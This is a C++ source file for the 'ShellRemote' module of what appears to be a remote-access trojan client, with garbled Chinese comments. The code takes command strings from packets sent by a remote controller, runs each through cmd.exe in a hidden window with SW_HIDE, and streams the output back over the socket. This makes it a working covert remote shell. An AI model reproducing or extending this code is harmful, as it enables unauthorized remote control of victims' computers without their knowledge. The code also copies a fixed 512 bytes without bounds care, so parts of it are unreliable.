#include "pch.h"
#include "ModuleShellRemote.h"
#include "SocketClient.h"


CModuleShellRemote::CModuleShellRemote(CSocketClient* pSocketClient) : CModule(pSocketClient) {

}


CModuleShellRemote::~CModuleShellRemote() {

}



void CModuleShellRemote::OnRecvivePacket(CPacket* pPacket) {
	CPacket* pPacketCopy = new CPacket(*pPacket);					// �ǵ����̺߳�������delete�����

	switch (pPacketCopy->m_PacketHead.wCommandId) {
		
	case SHELL_EXECUTE: 

		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ExecuteShell, (LPVOID)pPacketCopy, 0, NULL);
		// ���շ��֣����������߳�����ExecuteShell�������ܷ����ˡ��Ҳ²�Ӧ��Ҳ��OnReceive�ص���
		// ��Ҫ���ƶԻ���һ��ԭ����ΪExecuteShell��������ReadFile,�йܵ������ȴ���IO������

		break;

	case SHELL_CLOSE:
		m_pChildSocketClient->SendPacket(SHELL_CLOSE, NULL, 0);
		break;
	}
}


DWORD WINAPI ExecuteShell(LPVOID lParam)
{
	CPacket* pPacket = (CPacket*)lParam;
	WCHAR pszCommand[512];
	memcpy(pszCommand, pPacket->m_pbPacketBody, 512);
	CSocketClient* m_pChildSocketClient = pPacket->m_pSocketClient;

	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	HANDLE hRead = NULL, hWrite = NULL;

	WCHAR pszSystemPath[300] = { 0 };
	char SendBuf[2048] = { 0 };	
	SECURITY_ATTRIBUTES sa;				
	DWORD bytesRead = 0;
	int ret = 0;
	WCHAR pszExecuteCommand[512];

	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;

	//���������ܵ�
	if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
		goto Clean;
	}

	si.cb = sizeof(STARTUPINFO);
	GetStartupInfo(&si);
	si.hStdError = hWrite;
	si.hStdOutput = hWrite;	
	si.wShowWindow  =SW_HIDE;
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;

	// ��ȡϵͳĿ¼
	GetSystemDirectory(pszSystemPath, sizeof(pszSystemPath)); 
	// ƴ�ӳ�cmd����
	StringCbPrintf(pszExecuteCommand, 512, L"%s\\cmd.exe /c %s", pszSystemPath, pszCommand);

	// �������̣�ִ��cmd����
	if (!CreateProcess(NULL, pszExecuteCommand, NULL, NULL, TRUE, NULL, NULL, NULL, &si, &pi)) {
		printf("error = 0x%x\n", GetLastError());
		goto Clean;
	}

	while (TRUE)
	{
		bool bReadSuccess = ReadFile(hRead, SendBuf, sizeof(SendBuf), &bytesRead, NULL);

		if (!bReadSuccess) {
			break;
		}
		else {
			// TODO ����û��
			if (WAIT_OBJECT_0 != WaitForSingleObject(pPacket->m_pSocketClient->m_hChildSocketClientExitEvent, 0)) {
				BOOL bRet = m_pChildSocketClient->SendPacket(SHELL_EXECUTE, (PBYTE)SendBuf, bytesRead);
			}
			else {
				MessageBox(0, L"ClientSocket exit", L"", 0);
			}
		}

		memset(SendBuf, 0, sizeof(SendBuf));
		Sleep(100);	
	}

Clean:
	//�ͷž��
	if (hRead != NULL)
		CloseHandle(hRead);

	if (hWrite != NULL)
		CloseHandle(hWrite);

	if (pPacket != nullptr) {
		delete pPacket;
		pPacket = nullptr;
	}

	return 0;
}